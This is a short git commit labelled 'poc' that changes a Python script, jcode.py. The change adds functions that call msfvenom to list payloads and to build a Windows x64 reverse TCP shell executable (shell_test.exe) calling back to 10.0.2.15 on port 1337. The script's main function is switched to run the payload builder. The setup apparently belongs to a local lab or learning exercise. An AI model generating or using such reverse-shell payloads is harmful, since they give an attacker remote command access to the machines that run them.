4fd29ca91994f6a5fcebb09691017d8d996ea350
Jaime Serranzana <jcs909@gmail.com>
2021-12-18 14:11:15 -0500

    poc

--- jcode.py
+++ jcode.py
@@ -11,9 +11,19 @@ def get_local():  # define our line printing function
     return_code = subprocess.call(['ifconfig'])
     print("output:", return_code)
 
+def open_payloads():
+    return_code = subprocess.call(['msfvenom','-l','payloads'])
+    print("output:", return_code)
+
+def windows_reverse_payload():
+    return_code = subprocess.call(['msfvenom','-p','windows/x64/shell_reverse_tcp','LHOST=10.0.2.15','LPORT=1337','-f','exe','-o','shell_test.exe'])
+    print("output:", return_code)
+
 ### MAIN FUNCTION ###
 def main():  # define a main function
-    get_local()
+    windows_reverse_payload()
+    # open_payloads()
+    # get_local()
 
     # file_to_open = sys.argv[1]  # get the file name from the cmd line
 
